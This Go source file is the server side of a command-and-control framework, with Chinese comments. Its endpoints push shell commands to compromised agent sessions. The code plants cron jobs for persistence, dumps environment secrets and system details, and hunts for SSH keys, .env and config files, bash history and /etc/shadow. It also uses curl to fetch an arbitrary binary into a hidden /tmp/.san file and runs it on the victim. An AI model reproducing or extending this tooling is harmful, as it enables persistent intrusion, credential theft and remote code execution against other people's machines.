package server

// c2_upgrade.go — C2 第一批升级（参考 github-C2 功能面，基于 goc2 exec 通道实现）：
//   定时任务（schedule） / Kill Switch / 系统信息快照 / 敏感文件搜集 /
//   扫描下发（fscan/nmap 参数化） / 审计日志
// 全部走 exec 通用通道，结果落 c2_audit 表。

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"
)

// ---- 审计日志 ----

// ensureC2AuditTable 幂等建表。
func (s *Server) ensureC2AuditTable() {
	_, _ = s.m.PG().Exec(`CREATE TABLE IF NOT EXISTS c2_audit (
		id BIGSERIAL PRIMARY KEY,
		session_id TEXT NOT NULL DEFAULT '',
		hostname TEXT NOT NULL DEFAULT '',
		action TEXT NOT NULL,
		detail TEXT NOT NULL DEFAULT '',
		created_at TIMESTAMPTZ NOT NULL DEFAULT now()
	)`)
}

// c2Audit 写审计。
func (s *Server) c2Audit(sessionID, hostname, action, detail string) {
	_, _ = s.m.PG().Exec(`INSERT INTO c2_audit (session_id, hostname, action, detail) VALUES ($1,$2,$3,$4)`,
		sessionID, hostname, action, truncateStr(detail, 2000))
}

// GET /api/tools/c2/audit?limit=50 — 审计日志列表。
func (s *Server) c2AuditList(w http.ResponseWriter, r *http.Request) {
	s.ensureC2AuditTable()
	limit := parseIntDefault(r.URL.Query().Get("limit"), 50)
	if limit <= 0 || limit > 200 {
		limit = 50
	}
	rows, err := s.m.PG().Query(`SELECT id, session_id, COALESCE(hostname,''), action, COALESCE(detail,''), created_at
		FROM c2_audit ORDER BY id DESC LIMIT $1`, limit)
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	defer rows.Close()
	type item struct {
		ID        int64  `json:"id"`
		SessionID string `json:"session_id"`
		Hostname  string `json:"hostname"`
		Action    string `json:"action"`
		Detail    string `json:"detail"`
		CreatedAt string `json:"created_at"`
	}
	out := []item{}
	for rows.Next() {
		var it item
		var ts sql.NullTime
		if rows.Scan(&it.ID, &it.SessionID, &it.Hostname, &it.Action, &it.Detail, &ts) == nil {
			if ts.Valid {
				it.CreatedAt = ts.Time.Format("2006-01-02 15:04:05")
			}
			out = append(out, it)
		}
	}
	writeJSON(w, 200, map[string]any{"data": out})
}

// ---- 定时任务（Agent 侧 cron / systemd timer）----

// POST /api/tools/c2/schedule — 添加/列出/删除定时任务。
// action: add {interval_sec, cmd} / ls / rm {job_id} / clear
func (s *Server) c2Schedule(w http.ResponseWriter, r *http.Request) {
	var b struct {
		SessionID   string `json:"session_id"`
		Action      string `json:"action"`
		IntervalSec int    `json:"interval_sec"`
		Cmd         string `json:"cmd"`
		JobID       int    `json:"job_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
		writeErr(w, 400, "bad json: "+err.Error())
		return
	}
	if b.SessionID == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}
	var cmd string
	switch b.Action {
	case "add":
		if b.IntervalSec < 10 {
			writeErr(w, 400, "间隔最少 10 秒")
			return
		}
		if b.Cmd == "" {
			writeErr(w, 400, "命令必填")
			return
		}
		cmd = fmt.Sprintf(`(crontab -l 2>/dev/null | grep -v 'FORANG_SCH'; echo '*/%d * * * * %s # FORANG_SCH') | crontab -`,
			b.IntervalSec/60, b.Cmd)
	case "ls":
		cmd = `crontab -l 2>/dev/null | grep FORANG_SCH | nl`
	case "rm":
		cmd = fmt.Sprintf(`crontab -l 2>/dev/null | sed '%dd' | crontab -; echo "job %d removed"`, b.JobID, b.JobID)
	case "clear":
		cmd = `crontab -l 2>/dev/null | grep -v FORANG_SCH | crontab -; echo "cleared"`
	default:
		writeErr(w, 400, "action: add/ls/rm/clear")
		return
	}
	result, err := s.c2ExecAndWait(r, b.SessionID, cmd)
	if err != nil {
		writeErr(w, 502, "执行失败: "+err.Error())
		return
	}
	s.c2Audit(b.SessionID, "", "schedule_"+b.Action, fmt.Sprintf("interval=%d cmd=%s", b.IntervalSec, b.Cmd))
	writeJSON(w, 200, map[string]any{"data": map[string]any{"output": result}})
}

// ---- Kill Switch ----

// POST /api/tools/c2/kill — 紧急停机：向所有/指定会话下发 kill。
func (s *Server) c2KillSwitch(w http.ResponseWriter, r *http.Request) {
	var b struct {
		SessionID string `json:"session_id"` // 空=全部
	}
	_ = json.NewDecoder(r.Body).Decode(&b)

	targets := []string{}
	if b.SessionID != "" {
		targets = append(targets, b.SessionID)
	} else {
		clients, err := c2Client().ListClients(r.Context(), nil)
		if err == nil {
			for _, c := range clients {
				if m, ok := c.(map[string]any); ok {
					if id, _ := m["id"].(string); id != "" {
						targets = append(targets, id)
					}
				}
			}
		}
	}
	results := []map[string]any{}
	for _, id := range targets {
		_, err := c2Client().EnqueueTask(r.Context(), id, "exit", map[string]any{})
		st := "sent"
		if err != nil {
			st = "fail: " + err.Error()
		}
		results = append(results, map[string]any{"session_id": id, "status": st})
		s.c2Audit(id, "", "kill_switch", "")
	}
	writeJSON(w, 200, map[string]any{"data": results})
}

// ---- 系统信息快照 ----

// POST /api/tools/c2/sysinfo — 采集全量系统信息。
func (s *Server) c2Sysinfo(w http.ResponseWriter, r *http.Request) {
	var b struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.SessionID == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}
	cmds := []string{
		"uname -a",
		"cat /etc/os-release 2>/dev/null | head -5",
		"id && whoami",
		"ip -4 addr show 2>/dev/null || ifconfig",
		"cat /etc/resolv.conf 2>/dev/null | head -5",
		"ps aux --sort=-%cpu | head -20",
		"netstat -tlnp 2>/dev/null | head -20",
		"df -h / /tmp 2>/dev/null",
		"free -m 2>/dev/null",
		"crontab -l 2>/dev/null | head -10",
		"systemctl list-units --type=service --state=running 2>/dev/null | head -15",
		"docker ps 2>/dev/null | head -10",
		"env | grep -iE 'PASS|SECRET|TOKEN|KEY' | head -10",
	}
	var sb strings.Builder
	sb.WriteString("===== 系统信息快照 =====\n\n")
	for _, c := range cmds {
		out, err := s.c2ExecAndWait(r, b.SessionID, c)
		if err != nil {
			sb.WriteString(fmt.Sprintf("--- %s ---\n[错误] %s\n\n", c, err.Error()))
			continue
		}
		sb.WriteString(fmt.Sprintf("--- %s ---\n%s\n\n", c, out))
	}
	s.c2Audit(b.SessionID, "", "sysinfo", "")
	writeJSON(w, 200, map[string]any{"data": map[string]any{"report": sb.String()}})
}

// ---- 敏感文件搜集 ----

// POST /api/tools/c2/sensitive — 扫描目标机上的敏感文件与凭据。
func (s *Server) c2Sensitive(w http.ResponseWriter, r *http.Request) {
	var b struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.SessionID == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}
	cmds := []string{
		"find / -maxdepth 4 \\( -name 'id_rsa' -o -name '*.pem' -o -name '*.key' -o -name '*.p12' \\) -type f 2>/dev/null | head -15",
		"find / -maxdepth 3 \\( -name '.env' -o -name 'wp-config.php' -o -name 'config.php' -o -name 'database.yml' -o -name 'settings.py' \\) 2>/dev/null | head -15",
		"ls -la ~/.ssh/ 2>/dev/null",
		"cat ~/.bash_history 2>/dev/null | tail -30",
		"find /var/log -name '*.log' -newer /etc/hostname 2>/dev/null | head -10",
		"grep -r 'password' /etc/shadow /etc/sudoers 2>/dev/null | head -5",
		"find /tmp /var/tmp -type f -executable 2>/dev/null | head -10",
	}
	var sb strings.Builder
	sb.WriteString("===== 敏感文件扫描 =====\n\n")
	for _, c := range cmds {
		out, err := s.c2ExecAndWait(r, b.SessionID, c)
		if err != nil {
			continue
		}
		if strings.TrimSpace(out) != "" {
			sb.WriteString(fmt.Sprintf("--- %s ---\n%s\n\n", c, out))
		}
	}
	s.c2Audit(b.SessionID, "", "sensitive_scan", "")
	writeJSON(w, 200, map[string]any{"data": map[string]any{"report": sb.String()}})
}

// ---- 扫描下发 ----

// POST /api/tools/c2/scan — 下载扫描工具到目标机并执行。
func (s *Server) c2ScanDeploy(w http.ResponseWriter, r *http.Request) {
	var b struct {
		SessionID string `json:"session_id"`
		URL       string `json:"url"`       // 工具下载 URL（fscan/nmap 等）
		Args      string `json:"args"`      // 命令行参数
		Action    string `json:"action"`    // deploy_run / run / stop
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.SessionID == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}
	var cmd string
	switch b.Action {
	case "deploy_run":
		if b.URL == "" {
			writeErr(w, 400, "工具 URL 必填")
			return
		}
		cmd = fmt.Sprintf(`curl -sL '%s' -o /tmp/.san && chmod +x /tmp/.san && /tmp/.san %s`,
			b.URL, b.Args)
	case "run":
		cmd = fmt.Sprintf(`/tmp/.san %s`, b.Args)
	case "stop":
		cmd = `pkill -f '/tmp/.san' 2>/dev/null; echo "scan stopped"`
	default:
		writeErr(w, 400, "action: deploy_run/run/stop")
		return
	}
	result, err := s.c2ExecAndWait(r, b.SessionID, cmd)
	if err != nil {
		writeErr(w, 502, "执行失败: "+err.Error())
		return
	}
	s.c2Audit(b.SessionID, "", "scan_"+b.Action, b.Args)
	writeJSON(w, 200, map[string]any{"data": map[string]any{"output": result}})
}

// ---- 报告生成 ----

// GET /api/tools/c2/report?session_id= — 汇总该会话的系统信息+敏感文件+命令历史。
func (s *Server) c2Report(w http.ResponseWriter, r *http.Request) {
	sid := r.URL.Query().Get("session_id")
	if sid == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}
	// 拉取该会话全部任务结果
	tasks, err := c2Client().ListTasks(r.Context(), sid, nil)
	if err != nil {
		writeErr(w, 502, "查询失败: "+err.Error())
		return
	}
	var sb strings.Builder
	sb.WriteString("# C2 会话报告\n\n")
	sb.WriteString(fmt.Sprintf("> 会话: `%s`\n> 生成时间: %s\n\n", sid, time.Now().Format("2006-01-02 15:04:05")))

	// 统计
	total := len(tasks)
	execCount := 0
	for _, t := range tasks {
		if m, ok := t.(map[string]any); ok {
			if tp, _ := m["type"].(string); tp == "exec" {
				execCount++
			}
		}
	}
	sb.WriteString(fmt.Sprintf("## 概览\n\n- 任务总数: %d\n- 命令执行: %d\n\n", total, execCount))

	// 命令历史
	sb.WriteString("## 命令历史\n\n")
	for _, t := range tasks {
		m, ok := t.(map[string]any)
		if !ok {
			continue
		}
		tp, _ := m["type"].(string)
		if tp != "exec" {
			continue
		}
		args, _ := m["args"].(map[string]any)
		cmd, _ := args["cmd"].(string)
		output, _ := m["output"].(string)
		createdAt, _ := m["createdAt"].(string)
		sb.WriteString(fmt.Sprintf("### %s — `%s`\n\n```\n%s\n```\n\n", createdAt, cmd, truncateStr(output, 500)))
	}

	// 审计
	rows, _ := s.m.PG().Query(`SELECT action, COALESCE(detail,''), created_at FROM c2_audit
		WHERE session_id=$1 ORDER BY id DESC LIMIT 20`, sid)
	if rows != nil {
		defer rows.Close()
		sb.WriteString("\n## 审计记录\n\n")
		for rows.Next() {
			var action, detail string
			var ts sql.NullTime
			if rows.Scan(&action, &detail, &ts) == nil {
				t := ""
				if ts.Valid {
					t = ts.Time.Format("01-02 15:04:05")
				}
				sb.WriteString(fmt.Sprintf("- `%s` %s %s\n", t, action, detail))
			}
		}
	}
	writeJSON(w, 200, map[string]any{"data": map[string]any{"report": sb.String()}})
}

// ---- 辅助 ----

// c2ExecAndWait 在 handler 中同步执行命令并等待结果。
func (s *Server) c2ExecAndWait(r *http.Request, sessionID, cmd string) (string, error) {
	tid, err := c2Client().EnqueueTask(r.Context(), sessionID, "exec", map[string]any{"cmd": cmd})
	if err != nil {
		return "", err
	}
	if tid == "" {
		return "", fmt.Errorf("无 taskId")
	}
	// 轮询
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		time.Sleep(600 * time.Millisecond)
		tasks, err := c2Client().ListTasks(r.Context(), sessionID, nil)
		if err != nil {
			continue
		}
		for _, t := range tasks {
			m, ok := t.(map[string]any)
			if !ok {
				continue
			}
			id, _ := m["id"].(string)
			if id != tid {
				continue
			}
			if out, _ := m["output"].(string); out != "" {
				return out, nil
			}
			if st, _ := m["status"].(string); st == "done" || st == "completed" {
				return "", nil
			}
		}
	}
	return "", fmt.Errorf("30s 超时")
}
